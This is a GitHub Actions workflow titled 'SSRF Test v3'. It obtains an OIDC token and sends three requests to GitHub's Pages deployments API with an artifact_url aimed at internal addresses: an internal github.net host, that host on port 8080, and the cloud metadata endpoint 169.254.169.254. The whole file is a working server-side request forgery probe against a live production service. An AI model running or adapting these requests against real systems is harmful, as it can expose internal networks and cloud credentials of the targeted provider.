name: SSRF Test v3
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
  pages: write

jobs:
  ssrf-test:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
    - name: Get OIDC Token
      id: get-oidc
      run: |
        OIDC_TOKEN=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
          "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api.github.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
        echo "Got OIDC token (first 30 chars): ${OIDC_TOKEN:0:30}..."
        echo "oidc_token=$OIDC_TOKEN" >> $GITHUB_OUTPUT

    - name: Test SSRF via artifact_url - internal target
      env:
        OIDC_TOKEN: ${{ steps.get-oidc.outputs.oidc_token }}
      run: |
        echo "=== Testing artifact_url SSRF ==="
        echo "Target: http://ssrf-target.iad.github.net/"
        
        RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
          -X POST \
          -H "Authorization: Bearer $GITHUB_TOKEN" \
          -H "Accept: application/vnd.github+json" \
          -H "X-GitHub-Api-Version: 2022-11-28" \
          -H "Content-Type: application/json" \
          "https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments" \
          -d "{\"artifact_url\": \"http://ssrf-target.iad.github.net/\", \"pages_build_version\": \"ssrf-test-$(date +%s)\", \"oidc_token\": \"$OIDC_TOKEN\"}")
        echo "Response:"
        echo "$RESPONSE"
        
    - name: Test SSRF via artifact_url - port 8080
      env:
        OIDC_TOKEN: ${{ steps.get-oidc.outputs.oidc_token }}
      run: |
        echo "=== Testing port 8080 ==="
        RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
          -X POST \
          -H "Authorization: Bearer $GITHUB_TOKEN" \
          -H "Accept: application/vnd.github+json" \
          -H "X-GitHub-Api-Version: 2022-11-28" \
          -H "Content-Type: application/json" \
          "https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments" \
          -d "{\"artifact_url\": \"http://ssrf-target.iad.github.net:8080/\", \"pages_build_version\": \"ssrf-test-port8080-$(date +%s)\", \"oidc_token\": \"$OIDC_TOKEN\"}")
        echo "Response:"
        echo "$RESPONSE"

    - name: Test SSRF via artifact_url - metadata endpoint
      env:
        OIDC_TOKEN: ${{ steps.get-oidc.outputs.oidc_token }}
      run: |
        echo "=== Testing cloud metadata ==="
        RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
          -X POST \
          -H "Authorization: Bearer $GITHUB_TOKEN" \
          -H "Accept: application/vnd.github+json" \
          -H "X-GitHub-Api-Version: 2022-11-28" \
          -H "Content-Type: application/json" \
          "https://api.github.com/repos/$GITHUB_REPOSITORY/pages/deployments" \
          -d "{\"artifact_url\": \"http://169.254.169.254/latest/meta-data/\", \"pages_build_version\": \"ssrf-test-meta-$(date +%s)\", \"oidc_token\": \"$OIDC_TOKEN\"}")
        echo "Response:"
        echo "$RESPONSE"
